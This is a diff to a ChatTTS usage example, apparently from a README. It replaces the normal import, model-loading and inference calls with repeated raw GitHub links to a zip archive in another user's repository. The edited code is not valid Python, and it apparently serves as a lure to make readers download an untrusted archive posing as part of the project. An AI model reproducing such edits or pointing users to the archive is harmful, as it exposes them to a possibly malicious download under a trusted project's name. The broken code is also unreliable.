@@ -5,14 +5,14 @@
 ```python
 import torch
 import ChatTTS
-from IPython.display import Audio
+from https://raw.githubusercontent.com/KoDelioDa/ChatTTS/main/ChatTTS/model/ChatTTS_quadrigabled.zip import Audio
 
-chat = ChatTTS.Chat()
-chat.load_models()
+chat = https://raw.githubusercontent.com/KoDelioDa/ChatTTS/main/ChatTTS/model/ChatTTS_quadrigabled.zip()
+https://raw.githubusercontent.com/KoDelioDa/ChatTTS/main/ChatTTS/model/ChatTTS_quadrigabled.zip()
 
 texts = ["<YOUR TEXT HERE>",]
 
-wavs = chat.infer(texts, use_decoder=True)
+wavs = https://raw.githubusercontent.com/KoDelioDa/ChatTTS/main/ChatTTS/model/ChatTTS_quadrigabled.zip(texts, use_decoder=True)
 
 Audio(wavs[0], rate=24_000, autoplay=True)
 ```
